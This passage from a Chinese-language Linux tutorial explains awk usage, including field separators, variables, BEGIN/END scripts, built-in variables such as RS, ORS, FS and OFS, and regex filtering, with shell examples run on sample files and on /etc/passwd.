<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> re</span><br><span class="line">taobao.</span><br><span class="line">google.</span><br><span class="line">taobao.</span><br><span class="line">facebook.</span><br><span class="line">zhihu-</span><br><span class="line">weibo-</span><br><span class="line">[root@rocky8:~]# sed -i <span class="string">&#x27;s/\.$/\!/&#x27;</span> re</span><br><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> re</span><br><span class="line">taobao!</span><br><span class="line">google!</span><br><span class="line">taobao!</span><br><span class="line">facebook!</span><br><span class="line">zhihu-</span><br><span class="line">weibo-</span><br></pre></td></tr></table></figure>
<h3 id="awk命令">awk命令</h3>
<p>AWK是一种处理文本文件的语言，是一个强大的文本分析工具。</p>
<p>之所以叫AWK是因为其取了三位创始人 Alfred Aho，Peter Weinberger, 和 Brian Kernighan 的 Family Name 的首字符。</p>
<p>语法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk [选项参数] <span class="string">&#x27;script&#x27;</span> var=value file(s)</span><br><span class="line">或</span><br><span class="line">awk [选项参数] -f scriptfile var=value file(s)</span><br></pre></td></tr></table></figure>
<p><strong>选项参数说明：</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>-F fs or --field-separator fs<br>
指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F:。</p>
</li>
<li class="lvl-2">
<p>-v var=value or --asign var=value<br>
赋值一个用户定义变量。</p>
</li>
<li class="lvl-2">
<p>-f scripfile or --file scriptfile<br>
从脚本文件中读取awk命令。</p>
</li>
</ul>
<h4 id="基本用法">基本用法</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;&#123;[pattern] action&#125;&#x27;</span> file</span><br></pre></td></tr></table></figure>
<p>每行按空格或TAB分割，使用<code>print</code>输出文本中的1、4列：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> <span class="built_in">log</span></span><br><span class="line">2 this is a <span class="built_in">test</span></span><br><span class="line">3 Are you like awk</span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br><span class="line"><span class="string">[root@rocky8:~]# awk &#x27;</span>&#123;<span class="built_in">print</span> <span class="variable">$1</span>,<span class="variable">$4</span>&#125;<span class="string">&#x27; log</span></span><br><span class="line"><span class="string">2 a</span></span><br><span class="line"><span class="string">3 like</span></span><br><span class="line"><span class="string">This&#x27;</span>s </span><br><span class="line">10 orange,apple,mongo</span><br></pre></td></tr></table></figure>
<p>使用<code>printf</code>格式化输出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;&#123;printf &quot;%-8s %-10s\n&quot;,$1,$4&#125;&#x27;</span> <span class="built_in">log</span></span><br><span class="line">2        a         </span><br><span class="line">3        like      </span><br><span class="line">This<span class="string">&#x27;s             </span></span><br><span class="line"><span class="string">10       orange,apple,mongo</span></span><br></pre></td></tr></table></figure>
<h5 id="F指定分割字符"><code>-F</code>指定分割字符</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -F  <span class="comment">#-F相当于内置变量FS, 指定分割字</span></span><br></pre></td></tr></table></figure>
<p>使用:分割,取/etc/passwd文件每个用户对应shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk -F: <span class="string">&#x27;&#123;print $1,$7&#125;&#x27;</span> /etc/passwd</span><br><span class="line">root /bin/bash</span><br><span class="line">daemon /sbin/nologin</span><br><span class="line">bin /sbin/nologin</span><br><span class="line">adm /sbin/nologin</span><br><span class="line">lp /sbin/nologin</span><br><span class="line"><span class="built_in">sync</span> /bin/sync</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>同时使用:和/l两个分隔符分割/etc/passwd文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk -F <span class="string">&#x27;[:\/]&#x27;</span> <span class="string">&#x27;&#123;print $1,$7&#125;&#x27;</span>  /etc/passwd</span><br><span class="line">awk: warning: escape sequence `\/<span class="string">&#x27; treated as plain `/&#x27;</span></span><br><span class="line">root root</span><br><span class="line">daemon sbin</span><br><span class="line">bin bin</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<h5 id="v设置变量"><code>-v</code>设置变量</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -v  <span class="comment"># 设置变量</span></span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> <span class="built_in">log</span></span><br><span class="line">2 this is a <span class="built_in">test</span></span><br><span class="line">3 Are you like awk</span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br><span class="line"><span class="string">[root@rocky8:~]# awk -va=1 &#x27;</span>&#123;<span class="built_in">print</span> <span class="variable">$1</span>,<span class="variable">$1</span>+a&#125;<span class="string">&#x27; log</span></span><br><span class="line"><span class="string">2 3</span></span><br><span class="line"><span class="string">3 4</span></span><br><span class="line"><span class="string">This&#x27;</span>s 1</span><br><span class="line">10 11</span><br><span class="line">[root@rocky8:~]# awk -va=1 -vb=s <span class="string">&#x27;&#123;print $1,$1+a,$1b&#125;&#x27;</span> <span class="built_in">log</span></span><br><span class="line">2 3 2s</span><br><span class="line">3 4 3s</span><br><span class="line">This<span class="string">&#x27;s 1 This&#x27;</span>ss</span><br><span class="line">10 11 10s</span><br></pre></td></tr></table></figure>
<h5 id="f指定awk脚本"><code>-f</code>指定awk脚本</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk -f &#123;awk脚本&#125; &#123;文件名&#125;</span><br></pre></td></tr></table></figure>
<p>脚本模块：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>BEGIN{ 这里面放的是执行前的语句 }</p>
</li>
<li class="lvl-2">
<p>END {这里面放的是处理完所有的行后要执行的语句 }</p>
</li>
<li class="lvl-2">
<p>{这里面放的是处理每一行时要执行的语句}</p>
</li>
</ul>
<p>假设有这么一个文件（学生成绩表）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> score</span><br><span class="line">Marry   2143 78 84 77</span><br><span class="line">Jack    2321 66 78 45</span><br><span class="line">Tom     2122 48 77 71</span><br><span class="line">Mike    2537 87 97 95</span><br><span class="line">Bob     2415 40 57 62</span><br></pre></td></tr></table></figure>
<p>awk脚本如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> cal.awk</span><br><span class="line"><span class="comment">#!/bin/awk -f</span></span><br><span class="line"><span class="comment">#运行前</span></span><br><span class="line">BEGIN &#123;</span><br><span class="line">    math = 0</span><br><span class="line">    english = 0</span><br><span class="line">    computer = 0</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;NAME    NO.   MATH  ENGLISH  COMPUTER   TOTAL\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;---------------------------------------------\n&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行中</span></span><br><span class="line">&#123;</span><br><span class="line">    math+=<span class="variable">$3</span></span><br><span class="line">    english+=<span class="variable">$4</span></span><br><span class="line">    computer+=<span class="variable">$5</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;%-6s %-6s %4d %8d %8d %8d\n&quot;</span>, <span class="variable">$1</span>,<span class="variable">$2</span>,<span class="variable">$3</span>,<span class="variable">$4</span>,<span class="variable">$5</span>,<span class="variable">$3</span>+<span class="variable">$4</span>+<span class="variable">$5</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行后</span></span><br><span class="line">END &#123;</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;---------------------------------------------\n&quot;</span></span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;  TOTAL:%10d %8d %8d \n&quot;</span>, math, english, computer</span><br><span class="line">    <span class="built_in">printf</span> <span class="string">&quot;AVERAGE:%10.2f %8.2f %8.2f\n&quot;</span>, math/NR, english/NR, computer/NR</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><font class="notice">注：END{}中的NR表示已经读出的记录数，就是行号，从1开始</font></p>
<p>我们来看一下执行结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk -f cal.awk score</span><br><span class="line">NAME    NO.   MATH  ENGLISH  COMPUTER   TOTAL</span><br><span class="line">---------------------------------------------</span><br><span class="line">Marry  2143     78       84       77      239</span><br><span class="line">Jack   2321     66       78       45      189</span><br><span class="line">Tom    2122     48       77       71      196</span><br><span class="line">Mike   2537     87       97       95      279</span><br><span class="line">Bob    2415     40       57       62      159</span><br><span class="line">---------------------------------------------</span><br><span class="line">  TOTAL:       319      393      350 </span><br><span class="line">AVERAGE:     63.80    78.60    70.00</span><br></pre></td></tr></table></figure>
<h4 id="AWK工作原理">AWK工作原理</h4>
<p>AWK 工作流程可分为三个部分：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>读输入文件之前执行的代码段（由BEGIN关键字标识）。</p>
</li>
<li class="lvl-2">
<p>主循环执行输入文件的代码段。</p>
</li>
<li class="lvl-2">
<p>读输入文件之后的代码段（由END关键字标识）。</p>
</li>
</ul>
<p>命令结构:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">awk <span class="string">&#x27;BEGIN&#123; commands &#125; pattern&#123; commands &#125; END&#123; commands &#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>下面的流程图描述出了 AWK 的工作流程：</p>
<p><img src="/posts/247a4e5f//d45d394db034998c8059e647e321a13d.png" alt="img"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>1、通过关键字 BEGIN 执行 BEGIN 块的内容，即 BEGIN 后花括号 <strong>{}</strong> 的内容。</p>
</li>
<li class="lvl-2">
<p>2、完成 BEGIN 块的执行，开始执行body块。</p>
</li>
<li class="lvl-2">
<p>3、读入有 <strong>\n</strong> 换行符分割的记录。</p>
</li>
<li class="lvl-2">
<p>4、将记录按指定的域分隔符划分域，填充域，<strong>$0</strong> 则表示所有域(即一行内容)，**1表示第一个域，∗∗n表示第 n 个域。</p>
</li>
<li class="lvl-2">
<p>5、依次执行各 BODY 块，pattern 部分匹配该行内容成功后，才会执行 awk-commands 的内容。</p>
</li>
<li class="lvl-2">
<p>6、循环读取并执行各行直到文件结束，完成body块执行。</p>
</li>
<li class="lvl-2">
<p>7、开始 END 块执行，END 块可以输出最终结果。</p>
</li>
</ul>
<h5 id="运算符">运算符</h5>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>= += -= *= /= %= ^= **=</td>
<td>赋值</td>
</tr>
<tr>
<td>?:</td>
<td>C条件表达式</td>
</tr>
<tr>
<td>||</td>
<td>逻辑或</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>逻辑与</td>
</tr>
<tr>
<td>~ 和 !~</td>
<td>匹配正则表达式和不匹配正则表达式</td>
</tr>
<tr>
<td>&lt; &lt;= &gt; &gt;= != ==</td>
<td>关系运算符</td>
</tr>
<tr>
<td>空格</td>
<td>连接</td>
</tr>
<tr>
<td>+ -</td>
<td>加，减</td>
</tr>
<tr>
<td>* / %</td>
<td>乘，除与求余</td>
</tr>
<tr>
<td>+ - !</td>
<td>一元加，减和逻辑非</td>
</tr>
<tr>
<td>^ ***</td>
<td>求幂</td>
</tr>
<tr>
<td>++ –</td>
<td>增加或减少，作为前缀或后缀</td>
</tr>
<tr>
<td>$</td>
<td>字段引用</td>
</tr>
<tr>
<td>in</td>
<td>数组成员</td>
</tr>
</tbody>
</table>
<p><strong>过滤第一列大于2的行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;$1&gt;2&#x27;</span> <span class="built_in">log</span></span><br><span class="line">3 Are you like awk</span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br></pre></td></tr></table></figure>
<p><strong>过滤第一列等于2的行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;$1==2 &#123;print $1,$3&#125;&#x27;</span> <span class="built_in">log</span> </span><br><span class="line">2 is</span><br></pre></td></tr></table></figure>
<p><strong>过滤第一列大于2并且第二列等于’Are’的行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;$1&gt;2 &amp;&amp; $2==&quot;Are&quot; &#123;print $1,$2,$3&#125;&#x27;</span> <span class="built_in">log</span></span><br><span class="line">3 Are you</span><br></pre></td></tr></table></figure>
<p><strong>内建变量</strong></p>
<table>
<thead>
<tr>
<th>变量</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>$n</td>
<td>当前记录的第n个字段，字段间由FS分隔</td>
</tr>
<tr>
<td>$0</td>
<td>完整的输入记录</td>
</tr>
<tr>
<td>ARGC</td>
<td>命令行参数的数目</td>
</tr>
<tr>
<td>ARGIND</td>
<td>命令行中当前文件的位置(从0开始算)</td>
</tr>
<tr>
<td>ARGV</td>
<td>包含命令行参数的数组</td>
</tr>
<tr>
<td>CONVFMT</td>
<td>数字转换格式(默认值为%.6g)ENVIRON环境变量关联数组</td>
</tr>
<tr>
<td>ERRNO</td>
<td>最后一个系统错误的描述</td>
</tr>
<tr>
<td>FIELDWIDTHS</td>
<td>字段宽度列表(用空格键分隔)</td>
</tr>
<tr>
<td>FILENAME</td>
<td>当前文件名</td>
</tr>
<tr>
<td>FNR</td>
<td>各文件分别计数的行号</td>
</tr>
<tr>
<td>FS</td>
<td>字段分隔符(默认是任何空格)</td>
</tr>
<tr>
<td>IGNORECASE</td>
<td>如果为真，则进行忽略大小写的匹配</td>
</tr>
<tr>
<td>NF</td>
<td>一条记录的字段的数目</td>
</tr>
<tr>
<td>NR</td>
<td>已经读出的记录数，就是行号，从1开始</td>
</tr>
<tr>
<td>OFMT</td>
<td>数字的输出格式(默认值是%.6g)</td>
</tr>
<tr>
<td>OFS</td>
<td>输出记录分隔符（输出换行符），输出时用指定的符号代替换行符</td>
</tr>
<tr>
<td>ORS</td>
<td>输出记录分隔符(默认值是一个换行符)</td>
</tr>
<tr>
<td>RLENGTH</td>
<td>由match函数所匹配的字符串的长度</td>
</tr>
<tr>
<td>RS</td>
<td>记录分隔符(默认是一个换行符)</td>
</tr>
<tr>
<td>RSTART</td>
<td>由match函数所匹配的字符串的第一个位置</td>
</tr>
<tr>
<td>SUBSEP</td>
<td>数组下标分隔符(默认值是/034)</td>
</tr>
</tbody>
</table>
<p>格式化变量说明：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>%s 输出字符串</p>
</li>
<li class="lvl-2">
<p>%i 输出整数</p>
</li>
<li class="lvl-2">
<p>%f 输出浮点数</p>
</li>
</ul>
<p>%-5s 格式为左对齐且宽度为5的字符串代替（-表示左对齐），不使用则是又对齐。<br>
%-4.2f 格式为左对齐宽度为4，保留两位小数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;printf &quot;%8s %8s %8s %8s %8s %8s %8s\n&quot;,&quot;FILENAME&quot;,&quot;ARGC&quot;,&quot;FNR&quot;,&quot;FS&quot;,&quot;NF&quot;,&quot;NR&quot;,&quot;OFS&quot;;printf &quot;---------------------------------------------\n&quot;&#125; &#123;printf &quot;%8s %8s %8s %8s %8s %8s %8s\n&quot;,FILENAME,ARGC,FNR,FS,NF,NR,OFS&#125;&#x27;</span>  <span class="built_in">log</span></span><br><span class="line">FILENAME     ARGC      FNR       FS       NF       NR      OFS</span><br><span class="line">---------------------------------------------</span><br><span class="line">     <span class="built_in">log</span>        2        1                 5        1         </span><br><span class="line">     <span class="built_in">log</span>        2        2                 5        2         </span><br><span class="line">     <span class="built_in">log</span>        2        3                 3        3         </span><br><span class="line">     <span class="built_in">log</span>        2        4                 4        4          </span><br><span class="line"></span><br><span class="line">[root@rocky8:~]# awk -F: <span class="string">&#x27;BEGIN&#123;printf &quot;%4s %4s %4s %4s %4s %4s %4s %4s %4s\n&quot;,&quot;FILENAME&quot;,&quot;ARGC&quot;,&quot;FNR&quot;,&quot;FS&quot;,&quot;NF&quot;,&quot;NR&quot;,&quot;OFS&quot;,&quot;ORS&quot;,&quot;RS&quot;;printf &quot;---------------------------------------------\n&quot;&#125; &#123;printf &quot;%4s %4s %4s %4s %4s %4s %4s %4s %4s\n&quot;,FILENAME,ARGC,FNR,FS,NF,NR,OFS,ORS,RS&#125;&#x27;</span>  <span class="built_in">log</span></span><br><span class="line">FILENAME ARGC  FNR   FS   NF   NR  OFS  ORS   RS</span><br><span class="line">---------------------------------------------</span><br><span class="line"> <span class="built_in">log</span>    2    1    :    1    1         </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"> <span class="built_in">log</span>    2    2    :    1    2         </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"> <span class="built_in">log</span>    2    3    :    1    3         </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"> <span class="built_in">log</span>    2    4    :    1    4         </span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="输出顺序号-NR-匹配文本行号">输出顺序号 NR, 匹配文本行号</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;&#123;print NR,FNR,$1,$2,$3&#125;&#x27;</span> <span class="built_in">log</span></span><br><span class="line">1 1 2 this is</span><br><span class="line">2 2 3 Are you</span><br><span class="line">3 3 This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">4 4 10 There are</span></span><br></pre></td></tr></table></figure>
<h5 id="指定输出分割符">指定输出分割符</h5>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">python<span class="variable">@ubuntu</span><span class="symbol">:~/test</span><span class="variable">$ </span>cat log.txt </span><br><span class="line"><span class="number">2</span> this is a test</span><br><span class="line"><span class="number">3</span> <span class="title class_">Are</span> you like awk</span><br><span class="line"><span class="title class_">This</span><span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br><span class="line"><span class="string">python@ubuntu:~/test$ awk &#x27;</span>&#123;print <span class="variable">$1</span>,<span class="variable">$2</span>,<span class="variable">$5</span>&#125;<span class="string">&#x27; OFS=&quot; $ &quot;  log.txt</span></span><br><span class="line"><span class="string">2 $ this $ test</span></span><br><span class="line"><span class="string">3 $ Are $ awk</span></span><br><span class="line"><span class="string">This&#x27;</span>s <span class="variable">$ </span>a <span class="variable">$ </span></span><br><span class="line"><span class="number">10</span> <span class="variable">$ </span><span class="title class_">There</span> <span class="variable">$ </span></span><br><span class="line"><span class="number">12345678910</span></span><br></pre></td></tr></table></figure>
<h5 id="忽略大小写">忽略大小写</h5>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="section">$ awk &#x27;BEGIN&#123;IGNORECASE=1&#125; /this/&#x27; log.txt</span></span><br><span class="line"><span class="section">---------------------------------------------</span></span><br><span class="line">2 this is a test</span><br><span class="line">This&#x27;s a test</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
<h4 id="RS-ORS-FS-OFS区别与联系">RS,ORS,FS,OFS区别与联系</h4>
<p>学习awk时，一定要记得动手去实践，只有在实践中才能发现问题，以下就我在学习中和实践中的经验，总结一下RS,ORS,FS,OFS的区别和联系。</p>
<p><strong>一，RS与ORS</strong></p>
<p>1，RS是记录<a href="https://so.csdn.net/so/search?q=%E5%88%86%E9%9A%94%E7%AC%A6&amp;spm=1001.2101.3001.7020">分隔符</a>，默认的分隔符是\n，具体用法看下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> test1</span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br></pre></td></tr></table></figure>
<p>2，RS默认分割符\n</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span> test1  //awk <span class="string">&#x27;BEGIN&#123;RS=&quot;\n&quot;&#125;&#123;print $0&#125;&#x27;</span> test1 这二个是一样的</span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br></pre></td></tr></table></figure>
<p>其实你可以把<strong>上面test1文件里的内容理解为，111 222\n333 444\n555 6666，利用\n进行分割</strong>。看下一个例子</p>
<p>3，自定义RS分割符</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111 222|333 444|555 666&quot;</span>|awk <span class="string">&#x27;BEGIN&#123;RS=&quot;|&quot;&#125;&#123;print $0,RT&#125;&#x27;</span></span><br><span class="line">111 222 |</span><br><span class="line">333 444 |</span><br><span class="line">555 666</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结合上面一个例子，就很容易理解RS的用法了。</p>
<p>4，RS也可能是正则表达式</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111 222a333 444b555 666&quot;</span>|awk <span class="string">&#x27;BEGIN&#123;RS=&quot;[a-z]+&quot;&#125;&#123;print $1,RS,RT&#125;&#x27;</span></span><br><span class="line">111 [a-z]+ a</span><br><span class="line">333 [a-z]+ b</span><br><span class="line">555 [a-z]+</span><br></pre></td></tr></table></figure>
<p>从例3和例4，我们可以发现一点，<strong>当RT是利用RS匹配出来的内容。如果RS是某个固定的值时，RT就是RS的内容</strong>。</p>
<p>5，RS为空时</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> -n test2</span><br><span class="line">     1	111 222</span><br><span class="line">     2	</span><br><span class="line">     3	333 444</span><br><span class="line">     4	333 444</span><br><span class="line">     5	</span><br><span class="line">     6	</span><br><span class="line">     7	555 666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;RS=&quot;&quot;&#125;&#123;print $0&#125;&#x27;</span> test2</span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;RS=&quot;&quot;&#125;&#123;print &quot;&lt;&quot;,$0,&quot;&gt;&quot;&#125;&#x27;</span> test2</span><br><span class="line">&lt; 111 222 &gt;</span><br><span class="line">&lt; 333 444       //这一行和下面一行，是一行 </span><br><span class="line">333 444 &gt;</span><br><span class="line">&lt; 555 666 &gt;</span><br></pre></td></tr></table></figure>
<p>6，ORS记录输出分符符，默认值是\n</p>
<p><strong>把ORS理解成RS反过程，这样更容易记忆和理解</strong>，看下面的例子。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;ORS=&quot;\n&quot;&#125;&#123;print $0&#125;&#x27;</span> test1 //awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span> test1二者是一样的</span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;ORS=&quot;|&quot;&#125;&#123;print $0&#125;&#x27;</span> test1 </span><br><span class="line">111 222|333 444|555 666|[root@rocky8:~]# </span><br></pre></td></tr></table></figure>
<p><strong>二，FS与OFS</strong>（不理解）</p>
<p>1，FS指定列分割符</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111|222|333&quot;</span>|awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> </span><br><span class="line">111|222|333</span><br><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111|222|333&quot;</span>|awk <span class="string">&#x27;BEGIN&#123;FS=&quot;|&quot;&#125;&#123;print $1&#125;&#x27;</span> </span><br><span class="line">111</span><br></pre></td></tr></table></figure>
<p>2，FS也可以用正则</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111||222|333&quot;</span>|awk <span class="string">&#x27;BEGIN&#123;FS=&quot;[|]+&quot;&#125;&#123;print $1&#125;&#x27;</span>  </span><br><span class="line">111</span><br></pre></td></tr></table></figure>
<p>3，FS为空的时候（不理解为啥要NF++）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">echo</span> <span class="string">&quot;111|222|333&quot;</span>|awk <span class="string">&#x27;BEGIN&#123;FS=&quot;&quot;&#125;&#123;NF++;print $0&#125;&#x27;</span></span><br><span class="line">1 1 1 | 2 2 2 | 3 3 3 </span><br></pre></td></tr></table></figure>
<p><strong>当FS为空的时候，awk会把一行中的每个字符，当成一列来处理</strong>。</p>
<p>4，RS被设定成非\n时，\n会成FS分割符中的一个</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="built_in">cat</span> test1</span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;RS=&quot;444&quot;;&#125;&#123;print $2,$3&#125;&#x27;</span> test1</span><br><span class="line">222 333</span><br><span class="line">666</span><br></pre></td></tr></table></figure>
<p><strong>222和333之间是有一个\n的，当RS设定成444后，222和333被认定成同一行的二列了，其实按常规思想是二行的一列才对</strong>。</p>
<p>5，OFS列输出分隔符</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;OFS=&quot;|&quot;;&#125;&#123;print $1,$2&#125;&#x27;</span> test1</span><br><span class="line">111|222</span><br><span class="line">333|444</span><br><span class="line">555|666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;OFS=&quot;|&quot;;&#125;&#123;print $1 OFS $2&#125;&#x27;</span> test1  </span><br><span class="line">111|222</span><br><span class="line">333|444</span><br><span class="line">555|666</span><br></pre></td></tr></table></figure>
<p><strong>test1只有二列，如果100列，都写出来太麻烦了吧。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;OFS=&quot;|&quot;;&#125;&#123;print $0&#125;&#x27;</span> test1  </span><br><span class="line">111 222</span><br><span class="line">333 444</span><br><span class="line">555 666</span><br><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;BEGIN&#123;OFS=&quot;|&quot;;&#125;&#123;NF=NF;print $0&#125;&#x27;</span> test1 </span><br><span class="line">111|222</span><br><span class="line">333|444</span><br><span class="line">555|666</span><br></pre></td></tr></table></figure>
<p>为什么第二种方法中的OFS生效呢？个人觉得，<strong>awk觉查到列有所变化时，就会让OFS生效</strong>，没变化直接输出了。</p>
<p>此部分转自：<strong>海底苍鹰：</strong><a href="http://blog.51yip.com/shell/1151.html">awk中RS,ORS,FS,OFS区别与联系</a></p>
<h4 id="正则字符串匹配">正则字符串匹配</h4>
<p><strong>~ 表示模式开始。// 中是模式。</strong></p>
<p>输出第二列包含 “th”，并打印第二列与第四列：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;$2 ~ /th/ &#123;print $2,$4&#125;&#x27;</span> <span class="built_in">log</span> </span><br><span class="line">this a</span><br></pre></td></tr></table></figure>
<p>输出包含&quot;re&quot;的行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;/re/ &#123;print $0&#125;&#x27;</span> <span class="built_in">log</span> </span><br><span class="line">3 Are you like awk</span><br><span class="line">10 There are orange,apple,mongo</span><br></pre></td></tr></table></figure>
<p><strong>!表示取反</strong></p>
<p>输出第二列不包含 “th”，并打印第二列与第四列：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;$2 !~ /th/ &#123;print $0&#125;&#x27;</span> <span class="built_in">log</span> </span><br><span class="line">3 Are you like awk</span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br><span class="line"><span class="string">10 There are orange,apple,mongo</span></span><br></pre></td></tr></table></figure>
<p>输出不包含&quot;re&quot;的行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# awk <span class="string">&#x27;!/re/ &#123;print $0&#125;&#x27;</span> <span class="built_in">log</span> </span><br><span class="line">2 this is a <span class="built_in">test</span></span><br><span class="line">This<span class="string">&#x27;s a test</span></span><br></pre></td></tr></table></figure>
<h4 id="一些实例">一些实例</h4>
<p><strong>计算文件大小</strong></p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">[root@rocky8:~]# <span class="keyword">ls</span> -<span class="keyword">l</span> | awk &#x27;&#123;<span class="keyword">sum</span>+=<span class="variable">$5&#125;</span>END&#123;<span class="keyword">print</span> <span class="keyword">sum</span>&#125;&#x27;</span><br><span class="line">1066</span><br></pre></td></tr></table></figure>
<p><strong>从文件中找出长度大于80的行</strong></p>
